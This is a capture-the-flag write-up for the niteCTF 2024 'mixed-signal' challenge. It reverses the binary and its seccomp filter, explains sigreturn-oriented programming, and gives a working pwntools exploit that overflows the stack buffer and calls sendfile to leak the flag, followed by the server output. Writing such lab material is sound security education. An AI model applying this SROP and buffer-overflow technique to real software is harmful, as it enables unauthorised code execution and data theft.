# mixed-signal

## Challenge description
Answer the call!!

```bash
$ checksec vuln
[*] '/home/coraline/CTF/work/pwn-writeups/nitectf24/mixed-signal/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

## Reverse

This is the reversed code (using Ghidra). I've cleaned it up a bit for readability.

```C
undefined8 main(void)

{
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  check_flag();
  puts("freakbob calling,pickup!");
  prctl(0x26,1,0,0,0);
  local_a8 = 0x20;
  local_a6 = 0;
  local_a5 = 0;
  local_a4 = 4;
  local_a0 = 0x15;
  local_9e = 1;
  local_9d = 0;
  local_9c = 0xc000003e;
  local_98 = 6;
  local_96 = 0;
  local_95 = 0;
  local_94 = 0;
  local_90 = 0x20;
  local_8e = 0;
  local_8d = 0;
  local_8c = 0;
  local_88 = 0x35;
  local_86 = 0;
  local_85 = 1;
  local_84 = 0x40000000;
  local_80 = 6;
  local_7e = 0;
  local_7d = 0;
  local_7c = 0;
  local_78 = 0x15;
  local_76 = 0;
  local_75 = 1;
  local_74 = 0xf;
  local_70 = 6;
  local_6e = 0;
  local_6d = 0;
  local_6c = 0x7fff0000;
  local_68 = 0x15;
  local_66 = 0;
  local_65 = 1;
  local_64 = 0x3c;
  local_60 = 6;
  local_5e = 0;
  local_5d = 0;
  local_5c = 0x7fff0000;
  local_58 = 0x15;
  local_56 = 0;
  local_55 = 1;
  local_54 = 0xe7;
  local_50 = 6;
  local_4e = 0;
  local_4d = 0;
  local_4c = 0x7fff0000;
  local_48 = 0x15;
  local_46 = 0;
  local_45 = 1;
  local_44 = 0;
  local_40 = 6;
  local_3e = 0;
  local_3d = 0;
  local_3c = 0x7fff0000;
  local_38 = 0x15;
  local_36 = 0;
  local_35 = 1;
  local_34 = 1;
  local_30 = 6;
  local_2e = 0;
  local_2d = 0;
  local_2c = 0x7fff0000;
  local_28 = 0x15;
  local_26 = 0;
  local_25 = 1;
  local_24 = 0x28;
  local_20 = 6;
  local_1e = 0;
  local_1d = 0;
  local_1c = 0x7fff0000;
  local_18 = 6;
  local_16 = 0;
  local_15 = 0;
  local_14 = 0;
  local_b8[0] = 0x13;
  local_b0 = &local_a8;
  prctl(0x16,2,local_b8);
  vuln();
  syscall(0x3c,0);
  return 0;
}
```

```c
void check_flag(void) {
  int iVar1;
  
  iVar1 = open("flag.txt",0);
  if (iVar1 == -1) {
    printf("flag.txt not found");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return;
}
```

```c
void vuln(void) {
  undefined buf [8];
  
  read(0,buf,300);
  return;
}
```

```c
void gift(void) {
  syscall();
  return;
}
```

## Where to begin

1. There's a stack buffer overflow in `vuln` that will allow us to overwrite return address (no canary).
2. There's a seccomp filter
3. We're given a `gift` function that gives us a `syscall ; ret` gadget

`prctl` is being called to establish the seccomp filter on syscalls. The reversed source is a bit messy to read, but you can pick out the few values that look like they can be syscall values.

| Syscall Number | Syscall Name   | Action  |
| -------------- | -------------- | ------- |
| `0xe7` (231)   | `exit_group`   | Allowed |
| `0x3c` (60)    | `exit`         | Allowed |
| `0xf` (15)     | `rt_sigreturn` | Allowed |
| `0x28` (40)    | `sendfile`     | Allowed |

It looks like the only thing that can be useful for us is `rt_sigreturn` and `sendfile`.

One thing that stands out to me is that in `check_flag()` we open the flag file but never close it. This means that this I/O channel technically remains open for the duration of the program. This is super handy because file descriptor numbers are predictable. 0 is for stdin, 1 is for stdout, 2 is for stderr, and any dynamically opened files will just be assigned fd numbers starting from 3 and incremented onwards. 

Now this is perfect because we're allowed calls to `sendfile` which lets you move data between files without having to place a buffer in user-space. This is a pretty good giveaway as to what our exploit should look like. We want to transfer contents from the open `flag.txt` file into `stdout` using `sendfile`.
 
## Setup

Our goal is to somehow call `sendfile(1, flag_fd, 0, 0x100)` where `flag_fd` is the file descriptor number for the open `flag.txt` file. While the buffer overflow in `vuln` is really convenient, we'd need to control register values to be able to call `sendfile` the way that we want. The only register I knew that we can control is `rax` since calls to `read` will return # of bytes read to `rax`. 

Unfortunately, there were no good gadgets in the binary so I was a bit stumped. I looked on the web a bit and that's where I found out about SROP (sigreturn oriented programming). Essentially, you can use `rt_sigreturn` syscall to control any/all the register values!

Using the buffer overflow, we want to setup the ROP chain to look like:
1. Set `rax = 0xf (rt_sigreturn)` via call to `read`
2. Invoke `rt_sigreturn` syscall using `syscall ; ret` gadget. This will prime our register values.
3. Invoke `sendfile` syscall

## Exploit

Now that we've figured out the structure of our exploit, this should be pretty easy to implement. `pwntools` has support for SROP that makes crafting the payload pretty easy. 

As mentioned above, the file descriptor number for the open `flag.txt` is predictable. Since it's the only opened file in the process, we can assume that it's fd no is 3. The exploit worked perfectly on my local but it wasn't working on the docker / remote server. I had absolutely no idea why and it was driving me up a wall. Turns out that the fd number for local is different than it is in the remote server. This is probably because there are other open files (sockets) to have this binary available via network (don't quote me on this) I found that the `fd = 5` purely by trial and error.

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']
context.arch = 'amd64'

PROG = './chal'
elf = ELF(PROG)

### ------------------ EXPLOIT ------------------ ###

r = process(PROG)

syscall_ret = 0x40119a

pay = b'a' * (8*2)
pay += p64(elf.plt['read'])
pay += p64(syscall_ret)

frame = SigreturnFrame()
frame.rax = 0x28
frame.rdi = 1
# On remote, there are other open files (sockets)
frame.rsi = 5
# frame.rsi = 3
frame.rdx = 0
frame.r10 = 0x100
frame.rip = syscall_ret
frame.rsp = elf.sym['data_start']

pay += bytes(frame)

r.sendlineafter(b'pickup!', pay)

# Read in 0xf bytes to set rax = 0xf
r.send(b'b' * 0xf)

r.interactive()
```

```bash
[*] '/home/coraline/CTF/work/pwn-writeups/nitectf24/mixed-signal/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Opening connection to mixed-signal.chals.nitectf2024.live on port 1337: Done
[*] Switching to interactive mode

nite{b0b'5_s1gn4ls_h4v3_b33N_retUrN3D}
```